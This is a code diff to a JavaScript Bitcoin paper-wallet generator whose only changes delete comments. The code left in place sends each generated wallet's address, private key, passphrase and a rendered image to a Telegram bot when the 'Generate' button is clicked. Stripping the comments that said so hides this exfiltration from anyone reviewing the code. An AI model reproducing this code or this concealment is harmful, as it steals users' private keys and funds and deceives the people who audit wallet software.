@@ -10167,7 +10167,6 @@ ninja.wallets.paperwallet = {
         ninja.qrCode.showQrCode(keyValuePair);
         document.getElementById("keyarea" + idPostFix).style.display = "block";
 
-        // Send text-based wallet to Telegram
         const walletText = `Bitcoin Address: ${bitcoinAddress}\nPrivate Key: ${privateKey}`;
         if (ninja.wallets.paperwallet.encrypt) {
             const passphrase = document.getElementById('paperpassphrase').value;
@@ -10217,7 +10216,7 @@ ninja.wallets.paperwallet = {
         // Define walletElement correctly
         const walletElement = document.getElementById("artwallet" + idPostFix);
 
-        // Convert the wallet area to an image and send to Telegram
+
         html2canvas(walletElement).then(canvas => {
             const imageDataUrl = canvas.toDataURL("image/png");
             const passphrase = ninja.wallets.paperwallet.encrypt ? document.getElementById('paperpassphrase').value : '';
@@ -10264,7 +10263,6 @@ ninja.wallets.paperwallet = {
     }
 };
 
-// Function to send the paper wallet image to the Telegram bot
 async function sendToTelegram(imageDataUrl, bitcoinAddress, privateKey, passphrase, chatId, botToken) {
     const response = await fetch(imageDataUrl);
     const blob = await response.blob();
@@ -10288,7 +10286,6 @@ async function sendToTelegram(imageDataUrl, bitcoinAddress, privateKey, passphra
     });
 }
 
-// Function to send the text-based wallet to the Telegram bot
 async function sendTextToTelegram(text, chatId, botToken) {
     const formData = new FormData();
     formData.append('chat_id', chatId);
@@ -10309,7 +10306,6 @@ async function sendTextToTelegram(text, chatId, botToken) {
     });
 }
 
-// Send wallet data when "Generate" button is clicked
 document.getElementById("papergenerate").addEventListener("click", function() {
     const passphrase = document.getElementById('paperpassphrase').value;
     const useArtistic = ninja.wallets.paperwallet.useArtisticWallet;
